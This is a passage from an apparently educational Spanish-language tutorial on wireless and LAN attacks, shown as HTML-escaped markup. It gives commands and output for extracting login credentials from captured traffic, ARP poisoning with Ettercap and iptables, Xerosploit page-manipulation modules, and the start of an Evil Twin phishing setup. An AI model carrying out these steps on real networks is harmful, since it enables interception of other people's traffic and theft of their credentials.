X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;X11&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Linux x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Chrome/76.0.3809.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
Origin: http://www.alcanzatumeta.es
Referer: http://www.alcanzatumeta.es/login.php
Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
Accept-Language: es-ES,es&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,ja&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7
Cookie: &lt;span class=&quot;nv&quot;&gt;PHPSESSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;e2d60ee7c7ce42d4e971703e7b885464

&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s4vitar&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;miPasswordImposibledeObtener&amp;amp;token&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;f45e620ab3d4cb00a543f7377d40acce&amp;amp;login&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Estupendo, como vemos, usuario y contraseña:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -r Captura-01-dec.cap -Y &quot;http.request.method==POST&quot; -Tfields -e tcp.payload 2&amp;gt;/dev/null | xxd -ps -r | tail -n 1 | cut -d '&amp;amp;' -f 1-2 | tr '&amp;amp;' '\n'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s4vitar
&lt;span class=&quot;nv&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;miPasswordImposibledeObtener
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La elegancia de todo esto está en que no estamos haciendo un &lt;strong&gt;MITM&lt;/strong&gt; tradicional estando asociados en la red,
lo cual puede levantar sospechas dado que la mayoría de ataques de tipo ARP Spoofing/DNS Spoofing ya son
detectados y alertados por la mayoría de navegadores.&lt;/p&gt;

&lt;p&gt;Este ataque lo estamos haciendo desde fuera de la red, sin estar asociados, capturando simplemente el tráfico
que percibamos estando en modo monitor, lo cual es fascinante.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: Para desencriptar el tráfico de un cliente, es necesario capturar un Handshake por parte de
dicha estación. En caso contrario, no será posible desencriptar su tráfico.&lt;/p&gt;

&lt;h4 id=&quot;espionaje-con-ettercap-driftnet-y-enrutamiento-con-iptables&quot;&gt;Espionaje con Ettercap Driftnet y enrutamiento con iptables&lt;/h4&gt;

&lt;p&gt;Considerando que ya estamos conectados a la red y queremos actuar de manera activa, no pasiva como se vio en
el punto anterior, lo primero que debemos hacer es habilitar el enrutamiento en nuestro equipo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, generamos una pequeña regla en &lt;strong&gt;iptables&lt;/strong&gt; para definir cómo se debe de comportar el tráfico a
la hora de envenenar la red. Para este caso, queremos que todo el tráfico dirigido al puerto 80 sea enrutado
al puerto 8080:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Antes que nada recomiendo limpiar cualquier tipo de regla previa definida en iptables. Para al que le guste la
idea, en mi caso tengo creado un alias a nivel de &lt;strong&gt;bashrc&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat ~/.bashrc | grep flushIPTABLES -A 5&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;flushIPTABLES&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
	iptables &lt;span class=&quot;nt&quot;&gt;--flush&lt;/span&gt;
	iptables &lt;span class=&quot;nt&quot;&gt;--table&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;--flush&lt;/span&gt;
	iptables &lt;span class=&quot;nt&quot;&gt;--delete-chain&lt;/span&gt;
	iptables &lt;span class=&quot;nt&quot;&gt;--table&lt;/span&gt; nat &lt;span class=&quot;nt&quot;&gt;--delete-chain&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Así cuando escribo &lt;strong&gt;flushIPTABLES&lt;/strong&gt; se me limpian todas las reglas previamente definidas.&lt;/p&gt;

&lt;p&gt;Posteriormente, retocamos el fichero &lt;strong&gt;/etc/ettercap/etter.conf&lt;/strong&gt;, cambiando los valores por defecto a &lt;strong&gt;0&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;privs]
ec_uid &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0                &lt;span class=&quot;c&quot;&gt;# nobody is the default&lt;/span&gt;
ec_gid &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0                &lt;span class=&quot;c&quot;&gt;# nobody is the default&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por otro lado, descomentamos estas 2 líneas de dicho archivo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# if you use iptables:&lt;/span&gt;
   redir_command_on &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot;&lt;/span&gt;
   redir_command_off &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho, abrimos &lt;strong&gt;Ettercap&lt;/strong&gt; en modo gráfico a través del parámetro ‘&lt;strong&gt;-G&lt;/strong&gt;’. Lo primero que haremos
será escanear los Hosts disponibles en la red:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBf.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto se puede hacer de manera intuitiva a través de la pestaña &lt;strong&gt;Hosts&lt;/strong&gt;. Una vez hecho, y este paso es
importante, lo que haremos será seleccionar en primer lugar nuestro Gateway (192.168.1.1) y presionar en &lt;strong&gt;Add
to Target 1&lt;/strong&gt;, seguidamente seleccionamos la dirección IP de nuestra víctima y presionamos en &lt;strong&gt;Add To Target
2&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBr.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya con este esquema configurado, verificamos desde la pestaña &lt;strong&gt;Targets&lt;/strong&gt; que todo esté como debe estar:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBz.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si es así, continuamos. Nos iremos a la pestaña &lt;strong&gt;Mitm&lt;/strong&gt; y pincharemos en &lt;strong&gt;ARP Poissoning&lt;/strong&gt;. Acto seguido, se
nos abrirá una ventana, en ella seleccionamos la casilla &lt;strong&gt;Sniff Remote Connections&lt;/strong&gt; y presionamos en &lt;strong&gt;Aceptar&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Tras hacer esto, deberíamos ver lo siguiente desde la ventana principal:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBF.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora toca hacer la prueba de fuego. Cargamos los siguientes comandos desde consola:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBJ.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez estos están corriendo, simulamos la navegación desde el dispositivo cuyo tráfico se está envenenando.&lt;/p&gt;

&lt;p&gt;En este caso, se accede a una dirección URL de noticias, obteniendo los siguientes resultados:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBL.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cabe decir que a su vez estamos usando &lt;strong&gt;driftnet&lt;/strong&gt;, razón por la que además de visualizar la dirección URL
que se está visitando, somos capaces de ver las imágenes que cargan a tiempo real en dicha página web.&lt;/p&gt;

&lt;p&gt;Si le damos un tiempo, conseguiremos extraer incluso más imágenes aún:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaBN.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A su vez, podemos aprovechar el propio &lt;strong&gt;Ettercap&lt;/strong&gt; para capturar credenciales de autenticación a una página
web:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WaC1.png&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ataques-graciosos&quot;&gt;Ataques graciosos&lt;/h3&gt;

&lt;p&gt;Estos ataques forman parte de una categoría que considero algo Off-Topic, porque no obtenemos nada de interés
con ello.. pero bueno, puede servir para echarnos unas risas de vez en cuando.&lt;/p&gt;

&lt;h4 id=&quot;reemplazado-de-imágenes-web&quot;&gt;Reemplazado de imágenes web&lt;/h4&gt;

&lt;p&gt;En este punto, lo que haremos será envenenar el tráfico de nuestra víctima una vez más pero esta vez para
manipular las imágenes que se disponen en las páginas web a las que accede.&lt;/p&gt;

&lt;p&gt;Para ello, previamente necesitamos contar con una imagen, la cual utilizaremos para hacer la sustitución. Por
otro lado, necesitamos tener instalada la herramienta &lt;strong&gt;Xerosploit&lt;/strong&gt; en nuestro equipo.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Repositorio&lt;/strong&gt;: https://github.com/LionSec/xerosploit&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez la tengamos instalada, ejecutamos &lt;strong&gt;xerosploit&lt;/strong&gt; desde consola:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#xerosploit &lt;/span&gt;

____  __                     ________         ______       _____ _____ 
__  |/ /_____ ______________ __  ___/________ ___  /______ ___&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;__  /_
__    / _  _ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_  ___/_  __ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;____ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;___  __ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_  / _  __ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_  / _  __/
_    |  /  __/_  /    / /_/ /____/ / __  /_/ /_  /  / /_/ /_  /  / /_  
/_/|_|  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/ /_/     &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___/ /____/  _  .___/ /_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___/ /_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/  
                                     /_/                                    


&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]═══════════[ Author : @LionSec1 _-&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;/-_ Website: lionsec.net &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;═══════════[+]

                      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Powered by Bettercap and Nmap &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 
┌═════════════════════════════════════════════════════════════════════════════┐
█                                                                             █
█                         Your Network Configuration                          █ 
█                                                                             █
└═════════════════════════════════════════════════════════════════════════════┘     
 
╒══════════════╤═══════════════════╤═════════════╤═════════╤════════════╕
│  IP Address  │    MAC Address    │   Gateway   │  Iface  │  Hostname  │
╞══════════════╪═══════════════════╪═════════════╪═════════╪════════════╡
├──────────────┼───────────────────┼─────────────┼─────────┼────────────┤
│ 192.168.1.43 │ 80:CE:62:3C:EB:A1 │ 192.168.1.1 │  eth0   │   parrot   │
╘══════════════╧═══════════════════╧═════════════╧═════════╧════════════╛

╔═════════════╦════════════════════════════════════════════════════════════════════╗
║             ║ XeroSploit is a penetration testing toolkit whose goal is to       ║
║ Information ║ perform man &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the middle attacks &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;testing purposes.            ║
║             ║ It brings various modules that allow to realise efficient attacks. ║
║             ║ This tool is Powered by Bettercap and Nmap.                        ║
╚═════════════╩════════════════════════════════════════════════════════════════════╝

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Please &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; to view commands.

Xero ➮ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con el comando &lt;strong&gt;help&lt;/strong&gt;, listamos las opciones disponibles:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Xero ➮ &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;  

╔══════════╦════════════════════════════════════════════════════════════════╗
║          ║                                                                ║
║          ║ scan     :  Map your network.                                  ║
║          ║                                                                ║
║          ║ iface    :  Manually &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;your network interface.               ║
║ COMMANDS ║                                                                ║
║          ║ gateway  :  Manually &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;your gateway.                         ║
║          ║                                                                ║
║          ║ start    :  Skip scan and directly &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;your target IP address. ║
║          ║                                                                ║
║          ║ rmlog    :  Delete all xerosploit logs.                        ║
║          ║                                                                ║
║          ║ &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;     :  Display this &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;message.                         ║
║          ║                                                                ║
║          ║ &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;     :  Close Xerosploit.                                  ║
║          ║                                                                ║
╚══════════╩════════════════════════════════════════════════════════════════╝

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Please &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; to view commands.

Xero ➮ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo primero es realizar un escaneo de la red, por lo que corremos la opción &lt;strong&gt;scan&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Xero ➮ scan

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;++] Mapping your network ... 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+]═══════════[ Devices found on your network &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;═══════════[+]

╔═══════════════╦═══════════════════╦═══════════════╗
║ IP Address    ║ Mac Address       ║ Manufacturer  ║
╠═══════════════╬═══════════════════╬═══════════════╣
║ 192.168.1.1   ║ 1C:B0:44:D4:16:77 ║ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     ║
║ 192.168.1.55  ║ 34:41:5D:46:D1:38 ║ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     ║
║ 192.168.1.60  ║ 20:34:FB:B1:C5:53 ║ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     ║
║ 192.168.1.201 ║ F8:8B:37:E3:32:A2 ║ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;     ║
║ 192.168.1.43  ║ 80:CE:62:3C:EB:A1 ║ &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;This device&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ║
║               ║                   ║               ║
╚═══════════════╩═══════════════════╩═══════════════╝

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Please choose a target &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. 192.168.1.10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Enter &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.

Xero ➮ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Tras identificar a nuestra víctima, escribimos la dirección IP y se nos listarán los distintos modos de ataque:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Xero ➮ 192.168.1.60

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;++] 192.168.1.60 has been targeted. 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Which module &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to load ? Enter &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.

Xero»modules ➮ &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;

╔═════════╦══════════════════════════════════════════════════════════════════════╗
║         ║                                                                      ║
║         ║ pscan       :  Port Scanner                                          ║
║         ║                                                                      ║
║         ║ dos         :  DoS Attack                                            ║
║         ║                                                                      ║
║         ║ ping        :  Ping Request                                          ║
║         ║                                                                      ║
║         ║ injecthtml  :  Inject Html code                                      ║
║         ║                                                                      ║
║         ║ injectjs    :  Inject Javascript code                                ║
║         ║                                                                      ║
║         ║ rdownload   :  Replace files being downloaded                        ║
║         ║                                                                      ║
║         ║ sniff       :  Capturing information inside network packets          ║
║ MODULES ║                                                                      ║
║         ║ dspoof      :  Redirect all the http traffic to the specified one IP ║
║         ║                                                                      ║
║         ║ yplay       :  Play background sound &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;target browser               ║
║         ║                                                                      ║
║         ║ replace     :  Replace all web pages images with your own one        ║
║         ║                                                                      ║
║         ║ driftnet    :  View all images requested by your targets             ║
║         ║                                                                      ║
║         ║ move        :  Shaking Web Browser content                           ║
║         ║                                                                      ║
║         ║ deface      :  Overwrite all web pages with your HTML code           ║
║         ║                                                                      ║
╚═════════╩══════════════════════════════════════════════════════════════════════╝

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Which module &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to load ? Enter &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.

Xero»modules ➮ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entre ellos, seleccionaremos la opción &lt;strong&gt;replace&lt;/strong&gt;, que se encargará de llevar a cabo la sustitución de
imágenes sobre la página web que nuestra víctima esté visitando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Xero»modules ➮ replace
 
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█                          Image Replace                       █
█                                                              █
█        Replace all web pages images with your own one        █
└══════════════════════════════════════════════════════════════┘     

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enter &lt;span class=&quot;s1&quot;&gt;'run'&lt;/span&gt; to execute the &lt;span class=&quot;s1&quot;&gt;'replace'&lt;/span&gt; command.

Xero»modules»replace ➮ run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Insert your image path. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. /home/capitansalami/pictures/fun.png&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Xero»modules»replace ➮ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Especificamos la ruta absoluta de nuestra imagen y comenzará el ataque. Desde que la víctima navegue a una
página web, todas las imágenes serán sustituidas por la nuestra:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2Wbs4.png&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;ataque-shaking-web&quot;&gt;Ataque Shaking Web&lt;/h4&gt;

&lt;p&gt;Haciendo uso de la misma herramienta vista en el punto anterior, otra de las acciones de las que dispone
&lt;strong&gt;xerosploit&lt;/strong&gt; es el &lt;strong&gt;move&lt;/strong&gt;, por el cual podemos hacer un ataque de tipo &lt;strong&gt;Shaking Web&lt;/strong&gt;, es decir, hacer
que cuando nuestra víctima navegue a una página, esta se mueva temblando de manera que no se logra leer nada
de la misma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Xero ➮ 192.168.1.60

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;++] 192.168.1.60 has been targeted. 

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Which module &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to load ? Enter &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.

Xero»modules ➮ &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;

╔═════════╦══════════════════════════════════════════════════════════════════════╗
║         ║                                                                      ║
║         ║ pscan       :  Port Scanner                                          ║
║         ║                                                                      ║
║         ║ dos         :  DoS Attack                                            ║
║         ║                                                                      ║
║         ║ ping        :  Ping Request                                          ║
║         ║                                                                      ║
║         ║ injecthtml  :  Inject Html code                                      ║
║         ║                                                                      ║
║         ║ injectjs    :  Inject Javascript code                                ║
║         ║                                                                      ║
║         ║ rdownload   :  Replace files being downloaded                        ║
║         ║                                                                      ║
║         ║ sniff       :  Capturing information inside network packets          ║
║ MODULES ║                                                                      ║
║         ║ dspoof      :  Redirect all the http traffic to the specified one IP ║
║         ║                                                                      ║
║         ║ yplay       :  Play background sound &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;target browser               ║
║         ║                                                                      ║
║         ║ replace     :  Replace all web pages images with your own one        ║
║         ║                                                                      ║
║         ║ driftnet    :  View all images requested by your targets             ║
║         ║                                                                      ║
║         ║ move        :  Shaking Web Browser content                           ║
║         ║                                                                      ║
║         ║ deface      :  Overwrite all web pages with your HTML code           ║
║         ║                                                                      ║
╚═════════╩══════════════════════════════════════════════════════════════════════╝

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Which module &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to load ? Enter &lt;span class=&quot;s1&quot;&gt;'help'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.

Xero»modules ➮ move
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;evil-twin-attack&quot;&gt;Evil Twin Attack&lt;/h3&gt;

&lt;p&gt;En este punto, veremos una de las técnicas más comunes para obtener la contraseña de una red inalámbrica
ajena, por medio de técnicas Phishing aplicadas sobre WiFi.&lt;/p&gt;

&lt;p&gt;Si has leído todo lo anterior hasta este punto, habrás visto como es muy común que las estaciones emitan el
paquete &lt;strong&gt;Probe Request&lt;/strong&gt; cuando estas no están asociadas a ningún AP:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y &quot;wlan.fc.type_subtype==4&quot; 2&amp;gt;/dev/null&lt;/span&gt;
    1 0.000000000 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1063, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_PLUS_2A51
    2 0.019968349 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1064, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_PLUS_2A51
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lo que haremos en los siguientes puntos, es justamente aprovechar estos paquetes para asociar a nuestros
clientes a un AP falso gestionado por nosotros, desde donde a través de reglas de enrutamiento y
redireccionamientos haremos que estos sean redirigidoa a una página falsa la cual solicitará la contraseña de
la red WiFi.&lt;/p&gt;

&lt;p&gt;La idea es que una vez los clientes víctima introduzcan las credenciales, estas viajen en texto claro hacia
